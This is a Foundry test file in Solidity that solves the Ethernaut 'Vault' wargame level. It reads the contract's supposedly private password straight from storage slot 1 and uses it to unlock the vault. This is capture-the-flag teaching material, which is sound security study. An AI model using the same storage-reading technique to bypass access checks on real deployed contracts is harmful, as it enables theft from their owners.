// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {BaseTest} from "./BaseTest.t.sol";
import {VaultFactory} from "../src/Vault/VaultFactory.sol";
import {Vault} from "../src/Vault/Vault.sol";

contract VaultTest is BaseTest {
    function testVaultHack() public {
        ////////////////////*/
        //    Level Setup
        ////////////////////*/
        VaultFactory factory = new VaultFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Vault ethernaultVault = Vault(payable(levelAddress));

        ////////////////////*/
        //   Level Attack
        ////////////////////*/
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        ethernaultVault.unlock(password);
        assertEq(ethernaultVault.locked(), false);

        //////////////////////*/
        //  Level Submission
        //////////////////////*/
        bool levelCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertTrue(levelCompleted);
    }
}
